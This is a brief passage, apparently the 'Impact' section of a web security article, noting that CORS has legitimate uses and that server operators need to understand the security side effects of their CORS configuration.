## Impact

As with superpowers, it’s all about knowing how to use it. Therefore, CORS is not necessarily a bad thing. We’ve seen in many cases that CORS has legitimate use, and this is why it was invented and made a web standard in the first place. However, you need to be aware of the CORS configuration you set up in your server and the side effects this has on security.
